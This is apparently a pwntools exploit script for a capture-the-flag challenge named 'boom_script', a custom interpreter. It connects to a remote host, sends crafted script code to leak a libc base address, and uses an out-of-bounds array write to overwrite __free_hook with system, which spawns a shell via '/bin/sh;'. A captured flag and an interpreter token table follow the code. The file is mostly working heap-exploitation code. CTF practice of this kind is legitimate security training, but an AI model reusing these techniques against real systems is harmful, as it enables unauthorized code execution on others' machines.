from pwn import *

context(os = 'linux', arch = 'amd64', log_level = 'debug')
# io = process('boom_script')
io = remote('47.104.143.202', 41299)
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
elf = ELF('boom_script')


code = '''
    first = "bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb";
    first = "bbbbbbbbbbbbbbbbbbbbbbbb";
    second = "bbbbbbbb";
    prints(second);
    array arr1[4];
    arr1[0] = 1234567890;
    arr1[1] = 1234567890;
    printn(arr1[0]);
    third = "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa";
    fourth = "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa";  
    fifth  = "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa";
    fifth = "aaaaaaaa";
    fourth = "/bin/sh;";
    tmp1 = 0;
    x = 1;
    printn(x);
    inputn(tmp1);
    arr1[5] = tmp1;
    array arr2[4];
    array arr3[4];
    printn(x);
    tmp2 = 0;
    inputn(tmp2);
    arr3[0] = tmp2;
    fourth = "aaaaaaaaaaaaaaaa"
'''

io.sendlineafter('$', '1')
io.sendlineafter('length:\n', str(len(code)))
# gdb.attach(io)
io.sendafter('code:\n', code)
io.recvuntil('bbbbbbbb')
libc_base = u64(io.recv(6).ljust(8,b"\x00")) - libc.sym['__malloc_hook'] - 0x470
log.success(hex(libc_base))
__free_hook = libc_base + libc.sym['__free_hook']
system = libc_base + libc.sym['system']
one_gadget = libc_base + 0xe6c81

io.sendlineafter('1\n', str(__free_hook - 0x28))
io.sendlineafter('1\n', str(system))
# pause()
io.interactive()

# flag{35f2d3a9-bddc-9ffe-e8f7-ab999010b196}

''' 
               token         number
                     (       40(0x28)
                     )       41(0x29)
               small <       60(0x3c)
               big   >       62(0x3e)
                     {      123(0x7b)
                     }      125(0x7d)
               imm64        128(0x80)
               chr          129(0x81)
               string       130(0x82)
var_list[0] = 'array'       131(0x83)
var_list[1] = 'function'    132(0x84)
var_list[2] = 'else'        133(0x85)
var_list[3] = 'if'          134(0x86)
var_list[4] = 'return'      135(0x87)
var_list[5] = 'while'       136(0x88)
var_list[6] = 'printn'      137(0x89)
var_list[7] = 'prints'      138(0x8a)
var_list[8] = 'inputn'      139(0x8b)
var_list[9] = 'execve'      140(0x8c)
               or           142(0x8e)
               and          143(0x8f)
               equal        144(0x90)
               var          145(0x91)
               function     146(0x92)
               array_n      147(0x93)
               array_s      148(0x94)
               undefine     149(0x95)
               unequal      150(0x96)
               se    <=     151(0x97)
               be    >=     152(0x98)
'''
